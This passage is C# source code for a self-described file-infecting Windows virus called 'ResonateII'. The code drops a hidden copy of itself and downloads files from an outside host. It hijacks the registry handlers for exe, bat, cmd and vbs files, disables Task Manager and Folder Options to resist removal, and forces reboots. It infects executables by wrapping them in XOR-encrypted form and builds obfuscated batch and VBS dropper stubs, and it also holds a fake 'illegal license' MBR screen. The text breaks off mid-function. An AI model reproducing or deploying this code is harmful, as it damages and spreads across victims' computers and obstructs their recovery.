using Microsoft.Win32;
using Microsoft.CSharp;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Management;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Reflection;
using System.Media;
using System.Security.AccessControl;
using System.CodeDom.Compiler;
using System.Net;
using System.Net.Security;
using System.Speech.Synthesis;

namespace ResonateII
{
    static class Program
    {
        #region Unmanaged imports
        [DllImport("inpout32.dll")]
        extern static void Out32(short PortAddress, short Data);
        [DllImport("inpout32.dll")]
        extern static char Inp32(short PortAddress);

        [DllImport("user32.dll")]
        static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);
        private const int MOUSEEVENTF_MOVE = 0x0001;
        private const int MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const int MOUSEEVENTF_LEFTUP = 0x0004;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const int MOUSEEVENTF_RIGHTUP = 0x0010;
        private const int MOUSEEVENTF_MIDDLEDOWN = 0x0020;
        private const int MOUSEEVENTF_MIDDLEUP = 0x0040;
        private const int MOUSEEVENTF_ABSOLUTE = 0x8000;

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile(
            [MarshalAs(UnmanagedType.LPTStr)] string filename,
            [MarshalAs(UnmanagedType.U4)] FileAccess access,
            [MarshalAs(UnmanagedType.U4)] FileShare share,
            IntPtr securityAttributes, // optional SECURITY_ATTRIBUTES struct or IntPtr.Zero
            [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,
            [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes,
            IntPtr templateFile);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern IntPtr CreateFileA(
            [MarshalAs(UnmanagedType.LPStr)] string filename,
            [MarshalAs(UnmanagedType.U4)] FileAccess access,
            [MarshalAs(UnmanagedType.U4)] FileShare share,
            IntPtr securityAttributes,
            [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,
            [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes,
            IntPtr templateFile);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateFileW(
            [MarshalAs(UnmanagedType.LPWStr)] string filename,
            [MarshalAs(UnmanagedType.U4)] FileAccess access,
            [MarshalAs(UnmanagedType.U4)] FileShare share,
            IntPtr securityAttributes,
            [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,
            [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes,
            IntPtr templateFile);

        [DllImport("kernel32.dll")]
        static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer,
            uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten,
            [In] ref NativeOverlapped lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern bool SetComputerName(string lpComputerName);

        [DllImport("shell32.dll", EntryPoint = "#262", CharSet = CharSet.Unicode, PreserveSig = false)]
        public static extern void SetUserTile(string username, int notneeded, string picturefilename);

        #endregion
        #region Constants
        const byte mark = 0x4A;
        const byte mrpe = 0x3F;
        const string malName = "ResonateII";
        const int malRev = 0;
        const int bodySize = 238592;
        const string eHookString = "?exech_r";
        const string bHookString = "?batch_r";
        const string vHookString = "?vbsch_r";
        const string editIntercp = "?intercepte_r";
        const string softwarer = "HKEY_LOCAL_MACHINE\\Software\\";
        const string serverHN = "justquant.net";
        static string[] bFtype = new string[] { "*.txt", "*.doc?", "*.xls?", "*.ppt?", "*.bas", "*.vb", "*.cs", "*.cpp", "*.c", "*.h", "*.asm", "*.vbs", "*.bat", "*.cmd", "*.com", "*.jp?g", "*.bmp", "*.png", "*.gif", "*.ico", "*.py*", "*.wm?", "*.wav", "*.mp*", "*.mo?", "*.xm", "*.mod", "*.it", "*.iso", "*.img", "*.htm?", "*.php", "*.css", "*.flac", "*.rtf" };
        static string[] fUtype = new string[] { "*.exe", "*.dll", "*.ocx", "*.nls", "*.sys", "*.scr", "*.xml", "*.in?", "*.dat", "*.bin", "*.in?", "*.cpl", "*.drv", "*.msc", "*.ttf" };
        #region MBR
        static byte[] mbrData = {
    0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0xB4, 0x09, 0xB0, 0xA0, 0xB3, 0x0C, 0xB9,
    0x07, 0x00, 0xCD, 0x10, 0xB4, 0x02, 0xB6, 0x00, 0xB2, 0x00, 0xCD, 0x10,
    0xBE, 0x27, 0x7C, 0xB4, 0x0E, 0xAC, 0x08, 0xC0, 0x74, 0x04, 0xCD, 0x10,
    0xEB, 0xF7, 0xF4, 0x4E, 0x4F, 0x54, 0x49, 0x43, 0x45, 0x3A, 0x0A, 0x0A,
    0x0D, 0x49, 0x6C, 0x6C, 0x65, 0x67, 0x61, 0x6C, 0x20, 0x4D, 0x69, 0x63,
    0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F,
    0x77, 0x73, 0x20, 0x6C, 0x69, 0x63, 0x65, 0x6E, 0x73, 0x65, 0x20, 0x64,
    0x65, 0x74, 0x65, 0x63, 0x74, 0x65, 0x64, 0x21, 0x0A, 0x0D, 0x59, 0x6F,
    0x75, 0x20, 0x61, 0x72, 0x65, 0x20, 0x69, 0x6E, 0x20, 0x76, 0x69, 0x6F,
    0x6C, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x6F, 0x66, 0x20, 0x74, 0x68,
    0x65, 0x20, 0x44, 0x69, 0x67, 0x69, 0x74, 0x61, 0x6C, 0x20, 0x4D, 0x69,
    0x6C, 0x6C, 0x65, 0x6E, 0x6E, 0x69, 0x75, 0x6D, 0x20, 0x43, 0x6F, 0x70,
    0x79, 0x72, 0x69, 0x67, 0x68, 0x74, 0x20, 0x41, 0x63, 0x74, 0x21, 0x0A,
    0x0A, 0x0D, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x75, 0x6E, 0x61, 0x75, 0x74,
    0x68, 0x6F, 0x72, 0x69, 0x7A, 0x65, 0x64, 0x20, 0x6C, 0x69, 0x63, 0x65,
    0x6E, 0x73, 0x65, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E,
    0x20, 0x72, 0x65, 0x76, 0x6F, 0x6B, 0x65, 0x64, 0x0A, 0x0A, 0x0A, 0x0D,
    0x46, 0x6F, 0x72, 0x20, 0x6D, 0x6F, 0x72, 0x65, 0x20, 0x69, 0x6E, 0x66,
    0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x2C, 0x20, 0x70, 0x6C,
    0x65, 0x61, 0x73, 0x65, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x20, 0x75, 0x73,
    0x20, 0x61, 0x74, 0x3A, 0x0A, 0x0A, 0x0D, 0x20, 0x20, 0x20, 0x31, 0x2D,
    0x38, 0x38, 0x38, 0x2D, 0x4E, 0x4F, 0x50, 0x49, 0x52, 0x41, 0x43, 0x59,
    0x0A, 0x0A, 0x0A, 0x0D, 0x49, 0x66, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x61,
    0x72, 0x65, 0x20, 0x6F, 0x75, 0x74, 0x73, 0x69, 0x64, 0x65, 0x20, 0x74,
    0x68, 0x65, 0x20, 0x55, 0x53, 0x41, 0x2C, 0x20, 0x70, 0x6C, 0x65, 0x61,
    0x73, 0x65, 0x20, 0x6C, 0x6F, 0x6F, 0x6B, 0x20, 0x75, 0x70, 0x20, 0x74,
    0x68, 0x65, 0x20, 0x63, 0x6F, 0x72, 0x72, 0x65, 0x63, 0x74, 0x20, 0x63,
    0x6F, 0x6E, 0x74, 0x61, 0x63, 0x74, 0x20, 0x69, 0x6E, 0x66, 0x6F, 0x72,
    0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x0A, 0x0D, 0x6F, 0x6E, 0x20, 0x6F,
    0x75, 0x72, 0x20, 0x77, 0x65, 0x62, 0x73, 0x69, 0x74, 0x65, 0x2C, 0x20,
    0x61, 0x74, 0x3A, 0x0A, 0x0A, 0x0D, 0x20, 0x20, 0x20, 0x77, 0x77, 0x77,
    0x2E, 0x62, 0x73, 0x61, 0x2E, 0x6F, 0x72, 0x67, 0x0A, 0x0A, 0x0A, 0x0D,
    0x42, 0x75, 0x73, 0x69, 0x6E, 0x65, 0x73, 0x73, 0x20, 0x53, 0x6F, 0x66,
    0x74, 0x77, 0x61, 0x72, 0x65, 0x20, 0x41, 0x6C, 0x6C, 0x69, 0x61, 0x6E,
    0x63, 0x65, 0x0A, 0x0D, 0x50, 0x72, 0x6F, 0x6D, 0x6F, 0x74, 0x69, 0x6E,
    0x67, 0x20, 0x61, 0x20, 0x73, 0x61, 0x66, 0x65, 0x20, 0x26, 0x20, 0x6C,
    0x65, 0x67, 0x61, 0x6C, 0x20, 0x6F, 0x6E, 0x6C, 0x69, 0x6E, 0x65, 0x20,
    0x77, 0x6F, 0x72, 0x6C, 0x64, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
        #endregion
        #endregion
        #region Global variables
        static bool isSystem = false;
        static bool hooking = false;
        static bool hookVBS = false;
        static bool hookBAT = false;
        static bool intercp = false;
        static int iday;
        static int imonth;
        static int iyear;
        static int amod;
        static int intplayed = 0;
        static string dropLoc;
        static string dcPath;
        static string ilogs;
        #endregion
        [STAThread]
        static void Main(string[] args)
        {
            try
            {
                #region Initialization
                //Are we hooking something?
                string argm = JLib.ConvertStringArrayToStringJoin(args);
                if (argm.Contains(eHookString)) { hooking = true; }
                if (argm.Contains(vHookString)) { hookVBS = true; }
                if (argm.Contains(bHookString)) { hookBAT = true; }
                if (argm.Contains(editIntercp)) { intercp = true; }

                //Try and run a host
                if (!isSystem && !hooking && !hookBAT && !hookVBS && !intercp) { try { if (!startHostP(args)) { } } catch { } }
                #endregion
                #region Installation
                bool installd;
                try { installd = ((int)Registry.GetValue(softwarer + malName, "present", 0) == 1); }
                catch { installd = false; }

                if (!isSystem && !installd)
                {
                    //MessageBox.Show(Assembly.GetExecutingAssembly().Location + " is not a valid Win32 application.", Assembly.GetExecutingAssembly().Location, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    //MessageBox.Show("This file is infected with ResonateII\n\nIf you have run this file by mistake, DO NOT PRESS OK. Kill this process in Task Manager.\nOtherwise, enjoy the show.", "PROTECTIVE WARNING!!!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);

                    dropLoc = "WIN" + JLib.randString(8);

                    Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\" + malName, "wr", dropLoc, RegistryValueKind.String);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\" + malName, "present", 1, RegistryValueKind.DWord);

                    string dropLocation = Environment.GetEnvironmentVariable("windir") + "\\" + dropLoc + ".exe";

                    File.WriteAllBytes(dropLocation, getSelf());
                    File.SetAttributes(dropLocation, FileAttributes.Hidden | FileAttributes.System);
                    DirectoryInfo ddir = Directory.CreateDirectory(Environment.GetEnvironmentVariable("windir") + "\\system\\d\\");
                    ddir.Attributes = FileAttributes.Hidden | FileAttributes.System;
                    try
                    {
                        //DLLs
                        new WebClient().DownloadFile("http://" + serverHN + "/public/dlls/BassMOD.dll", Environment.GetEnvironmentVariable("windir") + "\\BassMOD.dll");
                        new WebClient().DownloadFile("http://" + serverHN + "/public/dlls/AxInterop.WMPLib.dll", Environment.GetEnvironmentVariable("windir") + "\\AxInterop.WMPLib.dll");
                        new WebClient().DownloadFile("http://" + serverHN + "/public/dlls/Interop.WMPLib.dll", Environment.GetEnvironmentVariable("windir") + "\\Interop.WMPLib.dll");
                        new WebClient().DownloadFile("http://" + serverHN + "/public/dlls/inpout32.dll", Environment.GetEnvironmentVariable("windir") + "\\inpout32.dll");
                        //Media files (for payloads)
                        new WebClient().DownloadFile("http://" + serverHN + "/public/bob.wav", Environment.GetEnvironmentVariable("windir") + "\\system\\d\\grass_beach.wav");
                        new WebClient().DownloadFile("http://" + serverHN + "/public/snoop.jpg", Environment.GetEnvironmentVariable("windir") + "\\system\\d\\snoop.jpg");
                        new WebClient().DownloadFile("http://" + serverHN + "/public/oab.wmv", Environment.GetEnvironmentVariable("windir") + "\\zz.wmv");
                        new WebClient().DownloadFile("http://" + serverHN + "/public/sweetdreams.jpg", Environment.GetEnvironmentVariable("windir") + "\\system\\d\\sweetdreams.jpg");
                        new WebClient().DownloadFile("http://" + serverHN + "/public/idoom.wav", Environment.GetEnvironmentVariable("windir") + "\\system\\d\\p.wav");
                        new WebClient().DownloadFile("http://" + serverHN + "/public/bbt.wav", Environment.GetEnvironmentVariable("windir") + "\\system\\d\\bbt.wav");
                        new WebClient().DownloadFile("http://" + serverHN + "/public/navalaugh1.wav", Environment.GetEnvironmentVariable("windir") + "\\system\\d\\nl.wav");
                    }
                    catch { }

                    //Create a folder for caching uninfected files
                    dcPath = Environment.GetEnvironmentVariable("SystemDrive") + "\\d_cache" + JLib.randString(16);
                    DirectoryInfo dirCa = Directory.CreateDirectory(dcPath);
                    dirCa.Attributes = FileAttributes.Hidden | FileAttributes.System;
                    DirectorySecurity dsec = dirCa.GetAccessControl();
                    dsec.AddAccessRule(new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Allow));
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\" + malName, "dcache", dcPath, RegistryValueKind.String);

                    //Hook EXE files
                    Registry.SetValue("HKEY_CLASSES_ROOT\\exefile\\shell\\open\\command", "", dropLoc + ".exe " + eHookString + " \"%1\" %*");

                    //Hook BAT and CMD files and intercept edits
                    Registry.SetValue("HKEY_CLASSES_ROOT\\batfile\\shell\\open\\command", "", dropLoc + ".exe " + bHookString + " \"%1\" %*");
                    Registry.SetValue("HKEY_CLASSES_ROOT\\batfile\\shell\\edit\\command", "", dropLoc + ".exe " + editIntercp + " \"%1\"");
                    Registry.SetValue("HKEY_CLASSES_ROOT\\cmdfile\\shell\\open\\command", "", dropLoc + ".exe " + bHookString + " \"%1\" %*");
                    Registry.SetValue("HKEY_CLASSES_ROOT\\cmdfile\\shell\\edit\\command", "", dropLoc + ".exe " + editIntercp + " \"%1\"");

                    //Hook VBS files and intercept edits
                    Registry.SetValue("HKEY_CLASSES_ROOT\\vbsfile\\shell\\open\\command", "", dropLoc + ".exe " + vHookString + " \"%1\" %*");
                    Registry.SetValue("HKEY_CLASSES_ROOT\\vbsfile\\shell\\edit\\command", "", dropLoc + ".exe " + editIntercp + " \"%1\"");

                    //Remember the date of infection
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\" + malName, "imonth", DateTime.Today.Month.ToString(), RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\" + malName, "iday", DateTime.Today.Day.ToString(), RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\" + malName, "iyear", DateTime.Today.Year.ToString(), RegistryValueKind.DWord);

                    int amod = JLib.rollDice(10) + 5;
                    Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\" + malName, "amod", amod, RegistryValueKind.DWord);

                    //Disable some stuff to make it harder to remove the virus
                    Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\", "NoFolderOptions", 1, RegistryValueKind.DWord);
                    Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", "DisableTaskMgr", 1, RegistryValueKind.DWord);
                    Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "NoWinKeys", 1, RegistryValueKind.DWord);

                    //One last touch ;)
                    Registry.SetValue(softwarer + "Microsoft\\Windows NT\\CurrentVersion\\", "RegisteredOwner", "ResonateII");
                    Registry.SetValue(softwarer + "Microsoft\\Windows NT\\CurrentVersion\\", "RegisteredOrganization", "justquant Industries");

                    Registry.SetValue(softwarer + malName, "intplayed", 0, RegistryValueKind.DWord);

                    ilogs = "C:\\" + JLib.randString(20) + ".log";
                    Registry.SetValue(softwarer + malName, "ilogs", ilogs, RegistryValueKind.String);
                    File.WriteAllText(ilogs, "INSTALL " + DateTime.Now.ToString());
                    File.SetAttributes(ilogs, FileAttributes.Hidden | FileAttributes.System);

                    int wms = JLib.rollDice(5) * 60000;

                    Thread.Sleep(wms);
                    JLib.DoExitWin(JLib.EWX_REBOOT | JLib.EWX_FORCE);
                }
                dropLoc = (string)Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\" + malName, "wr", "NaN");
                dcPath = (string)Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\" + malName, "dcache", "NaN");
                imonth = (int)Registry.GetValue(softwarer + malName, "imonth", 0);
                iday = (int)Registry.GetValue(softwarer + malName, "iday", 0);
                iyear = (int)Registry.GetValue(softwarer + malName, "iyear", 0);
                amod = (int)Registry.GetValue(softwarer + malName, "amod", 0);
                ilogs = (string)Registry.GetValue(softwarer + malName, "ilogs", "NaN");
                intplayed = (int)Registry.GetValue(softwarer + malName, "intplayed", 0);
                #endregion
                #region Hook routines
                //if (JLib.rollDice(5) == 3) new Thread(redThread);
                if (hooking)
                {
                    /*
                    string arz = string.Join(" ", args).Replace(eHookString + " ", "");
                    if (!(args.Count() > 2))
                    */
                    int d = doPayloads();
                    if (d > 0)
                        if (!(args[1].Contains("cmd") || args[1].Contains("regedit") || args[1].Contains("msconfig")))
                        {
                            string arz = string.Join(" ", args).Replace(eHookString + " ", "").Replace(args[1], "");
                            ProcessStartInfo hook = new ProcessStartInfo(args[1], arz);
                            hook.UseShellExecute = false;
                            //MessageBox.Show("DEBUG: trying to start " + args[1] + " with " + arz);
                            Process hp = Process.Start(hook);
                            try { while (!hp.HasExited) Thread.Sleep(1000); } catch { }
                            byte[] h = File.ReadAllBytes(args[1]);
                            if (!(h[h.Length - 1] == mrpe))
                                rsInfect(args[1]);
                            if (d == 2)
                                while (true)
                                    Thread.Sleep(60000);
                        }
                        else bender(true);
                }
                if (intercp)
                {
                    FileInfo st = new FileInfo(args[1]);
                    string cacheF = dcPath + "\\" + args[1].Replace(st.Directory.Root.ToString(), "");
                    if (File.Exists(cacheF))
                    {
                        ProcessStartInfo hook = new ProcessStartInfo("notepad.exe", cacheF);
                        hook.UseShellExecute = false;
                        try
                        {
                            Process n = Process.Start(hook);
                            while (!n.HasExited) Thread.Sleep(1000);
                            File.Delete(args[1]);
                            File.Copy(cacheF, args[1]);
                            if (st.Extension == "cmd" || st.Extension == "bat") encapBatch(args[1]);
                            else if (st.Extension == "vbs") encapVBS(args[1]);
                        }
                        catch { }
                    }
                    else
                    {
                        if (!(File.ReadAllText(args[1]).StartsWith("'J") || File.ReadAllText(args[1]).StartsWith("%nul%%nul%"))) try
                            {
                                ProcessStartInfo hook = new ProcessStartInfo("notepad.exe", cacheF);
                                hook.UseShellExecute = false;
                                Process n = Process.Start(hook);
                                while (!n.HasExited) Thread.Sleep(1000);
                                try
                                {
                                    File.Delete(args[1]);
                                    File.Copy(cacheF, args[1], true);
                                    if (st.Extension == "cmd" || st.Extension == "bat") encapBatch(args[1]);
                                    else if (st.Extension == "vbs") encapVBS(args[1]);
                                }
                                catch { }
                            }
                            catch { MessageBox.Show(args[1] + " is not accessible.\n\nThe file or directory is corrupted and unreadable.", st.Directory.ToString(), MessageBoxButtons.OK, MessageBoxIcon.Error); }
                        else MessageBox.Show(args[1] + " is not accessible.\n\nThe file or directory is corrupted and unreadable.", st.Directory.ToString(), MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }

                }
                if (hookBAT)
                {
                    try { encapBatch(args[1]); } catch { }
                    string arz = string.Join(" ", args).Replace(eHookString + " ", "").Replace(args[1], "");
                    ProcessStartInfo hook = new ProcessStartInfo(args[1], arz);
                    hook.UseShellExecute = false;
                    try { Process.Start(hook); } catch { }
                }
                if (hookVBS)
                {
                    try { encapVBS(args[1]); } catch { }
                    string arz = string.Join(" ", args).Replace(eHookString + " ", "").Replace(args[1], "");
                    ProcessStartInfo hook = new ProcessStartInfo("wscript.exe", "\"" + args[1] + "\" " + arz);
                    hook.UseShellExecute = false;
                    try { Process.Start(hook); } catch { }
                }
                #endregion
            }
            catch (Exception e) { JLib.standardExceptionBox(e); }
            //catch { }
        }
        #region File Infection
        #region Engines
        #region Rimshot
        //RIMshot (Run In Memory) v1
        //Because companion files don't cut it
        //Infects portable executable .EXEs
        #region Infection
        static bool rsInfect(string filename)
        {
            try
            {
                Module mod = Assembly.GetExecutingAssembly().GetModules()[0]; // Get our current host file
                FileStream cHost = new FileStream(mod.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read); // Open a stream
                byte[] vBody = JLib.read(cHost, bodySize, 0); // Find ourself, load into memory
                cHost.Close(); // Close stream
                FileStream nHost = new FileStream(filename, FileMode.OpenOrCreate, FileAccess.Read); // Get new host
                int i = (int)nHost.Length; // Get length
                byte[] hBody = JLib.read(nHost, i, 0); // Load into memory
                nHost.Close(); // Close stream
                string key = JLib.randString(8); // Generate a random key
                byte[] keyB = Encoding.ASCII.GetBytes(key); // Get the bytes
                byte[] HBEnc = Encoding.ASCII.GetBytes(JLib.XOR(Convert.ToBase64String(hBody), key)); // Let's XOR cipher the host with our brand new key
                byte[] signature = { mrpe }; // Get our signature
                FileStream nH = new FileStream(filename, FileMode.OpenOrCreate, FileAccess.Write); // Open the new host for write access
                assemble(nH, vBody, keyB, HBEnc, signature); // Assemble our byte arrays into the file
                logWrite("INFECT " + filename);
                return true;
            }
            catch { return false; }
        }
        static void assemble(FileStream s, byte[] h, byte[] i, byte[] j, byte[] k) // Used to combine byte arrays to assemble infected files
        {
            BinaryWriter w = new BinaryWriter(s); // Make a binary writer object
            w.BaseStream.Seek(0, SeekOrigin.Begin); // Seek the beginning of the stream
            w.Write(h); // Write virus body
            w.Write(i); // Write encryption key
            w.Write(j); // Write encrypted host
            w.Write(k); // Write signature
            w.Flush(); // Flush
            w.Close(); // Close stream
        }
        #endregion
        #region Execution
        static void buckshot(string[] args)
        {
            FileStream fs1 = new FileStream(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read); // Open filestream
            FileStream fs2 = new FileStream(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read); // Bizarre bugfix
            int fileL = (int)fs1.Length; // Get our file length
            int hLength = fileL - bodySize; // Get the host length
            byte[] hostCode = JLib.read(fs1, hLength - 9, bodySize + 8); // Get the XOR'd bytes
            byte[] xKey = JLib.read(fs2, 8, bodySize); // Grab our key
            string key = Encoding.ASCII.GetString(xKey); // Get the key in ASCII
            string hst = Encoding.ASCII.GetString(hostCode); // Get XOR'd Base64 of host
            fs1.Close(); // Close filestreams
            fs2.Close(); // ...
            string dHost = JLib.XOR(hst, key); // XOR the key and host
            byte[] hostBytes = Convert.FromBase64String(dHost); // Convert Base64 to byte array
            string hdp = Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName + ".exe";
            File.WriteAllBytes(hdp, hostBytes);
            File.SetAttributes(hdp, FileAttributes.Hidden);
            ProcessStartInfo h = new ProcessStartInfo(hdp, string.Join(" ", args));
            h.WorkingDirectory = Directory.GetCurrentDirectory();
            Process hP = Process.Start(h);
            //MessageBox.Show("DEBUG: started rimshot host in buckshot mode");
            while (!hP.HasExited)
                Thread.Sleep(1000);
            File.Delete(hdp);
        }
        #endregion
        #endregion
        #region Encap64x
        //ENCAPsulate base64 eXtended
        //Because when I say "batch virus", I MEAN IT
        //Infects Visual Basic scripts and batch scripts
        static string capGenerate()
        {
            //Really messy function for generating obfuscated batch stubs
            //There's probably much more efficient ways of doing this
            //I don't care
            //It works well enough
            string smrk = "'" + JLib.randString(4);
            string bbin = JLib.randString(8) + ".vbs";
            string vext = JLib.randString(8) + ".exe";
            string jmpi = JLib.randString(16);

            string tbin = JLib.randString(8);
            string fred = JLib.randString(8);
            string fwrt = JLib.randString(8);
            string frpd = JLib.randString(8);

            string tdir = JLib.randString(8);

            string dbdm = JLib.randString(8);
            string dbel = JLib.randString(8);

            string wbst = JLib.randString(8);

            string bsfd = JLib.randString(8);
            string dbod = JLib.randString(8);

            string dcbs = JLib.randString(8);
            string wbyt = JLib.randString(8);

            string imrk = "%nul%%nul%";
            string btmp = "%temp%";
            string ptfz = "\"%~f0\"";

            //imrk
            string upperCap0 = @"@echo off
FINDSTR /E """ + smrk + @""" ";
            //ptfz
            string upperCap1 = @" >";
            //btmp
            string upperCap2 = @"\" + bbin + @"
cscript //nologo ";
            //btmp
            string upperCap3 = @"\" + bbin + @"
start ";
            //btmp
            string upperCap4 = @"\" + vext + @"
goto " + jmpi + @"";

            string upperCap = imrk;
            foreach (string s in upperCap0.SplitInParts(1))
            {
                if (JLib.rollDice(8) == 3)
                {
                    upperCap = upperCap + s + "%nul%";
                }
                else
                {
                    upperCap = upperCap + s;
                }
            }
            upperCap = upperCap + ptfz;
            foreach (string s in upperCap1.SplitInParts(1))
            {
                if (JLib.rollDice(8) == 3)
                {
                    upperCap = upperCap + s + "%nul%";
                }
                else
                {
                    upperCap = upperCap + s;
                }
            }
            upperCap = upperCap + btmp;
            foreach (string s in upperCap2.SplitInParts(1))
            {
                if (JLib.rollDice(8) == 3)
                {
                    upperCap = upperCap + s + "%nul%";
                }
                else
                {
                    upperCap = upperCap + s;
                }
            }
            upperCap = upperCap + btmp;
            foreach (string s in upperCap3.SplitInParts(1))
            {
                if (JLib.rollDice(8) == 3)
                {
                    upperCap = upperCap + s + "%nul%";
                }
                else
                {
                    upperCap = upperCap + s;
                }
            }
            upperCap = upperCap + btmp;
            foreach (string s in upperCap4.SplitInParts(1))
            {
                if (JLib.rollDice(8) == 3)
                {
                    upperCap = upperCap + s + "%nul%";
                }
                else
                {
                    upperCap = upperCap + s;
                }
            }

            string capScript = @"
Option Explicit " + smrk + @"
Const " + tbin + @" = 1 " + smrk + @"
Const " + fred + @" = 1, " + fwrt + @" = 2, " + frpd + @" = 8 " + smrk + @"
Dim " + bsfd + @" " + smrk + @"
" + bsfd + @" = """ + Convert.ToBase64String(File.ReadAllBytes(Assembly.GetExecutingAssembly().Location)) + @""" " + smrk + @"
Dim " + dbod + @" " + smrk + @"
" + dbod + @" = " + dcbs + @"(" + bsfd + @") " + smrk + @"
Dim " + tdir + @" " + smrk + @"
" + tdir + @" = WScript.CreateObject(""Scripting.FileSystemObject"").GetSpecialFolder(2) " + smrk + @"
" + wbyt + @" " + tdir + @" +""\" + vext + @""", " + dbod + @" " + smrk + @"
private function " + dcbs + @"(base64) " + smrk + @"
  dim " + dbdm + @", " + dbel + @" " + smrk + @"
  Set " + dbdm + @" = CreateObject(""Microsoft.XMLDOM"") " + smrk + @"
  Set " + dbel + @" = " + dbdm + @".createElement(""tmp"") " + smrk + @"
  " + dbel + @".DataType = ""bin.base64"" " + smrk + @"
  " + dbel + @".Text = base64 " + smrk + @"
  " + dcbs + @" = " + dbel + @".NodeTypedValue " + smrk + @"
end function " + smrk + @"
private Sub " + wbyt + @"(file, bytes) " + smrk + @"
  Dim " + wbst + @" " + smrk + @"
  Set " + wbst + @" = CreateObject(""ADODB.Stream"") " + smrk + @"
  " + wbst + @".Type = " + tbin + @" " + smrk + @"
  " + wbst + @".Open " + smrk + @"
  " + wbst + @".Write bytes " + smrk + @"
  " + wbst + @".SaveToFile file, " + fwrt + @" " + smrk + @"
End Sub " + smrk + @"
:" + jmpi + @"
";
            return upperCap + capScript;
        }
        static string capGenerateV(bool dexplicit, string ofile)
        {
            //Function for generated obfuscated VBS stubs
            //Basically the batch one with some stuff chopped out
            string smrk = "'" + JLib.randString(4);
            string bbin = JLib.randString(8) + ".vbs";
            string vext = JLib.randString(8) + ".exe";
            string jmpi = JLib.randString(16);

            string tbin = JLib.randString(8);
            string fred = JLib.randString(8);
            string fwrt = JLib.randString(8);
            string frpd = JLib.randString(8);

            string tdir = JLib.randString(8);

            string dbdm = JLib.randString(8);
            string dbel = JLib.randString(8);

            string wbst = JLib.randString(8);

            string bsfd = JLib.randString(8);
            string dbod = JLib.randString(8);

            string dcbs = JLib.randString(8);
            string wbyt = JLib.randString(8);

            string expls = "Option Explicit";
            if (dexplicit)
            {
                expls = "";
            }

            string capScript = @"'J
" + expls + @" " + smrk + @"
Const " + tbin + @" = 1 " + smrk + @"
Const " + fred + @" = 1, " + fwrt + @" = 2, " + frpd + @" = 8 " + smrk + @"
Dim " + bsfd + @" " + smrk + @"
" + bsfd + @" = """ + Convert.ToBase64String(File.ReadAllBytes(Assembly.GetExecutingAssembly().Location)) + @""" " + smrk + @"
Dim " + dbod + @" " + smrk + @"
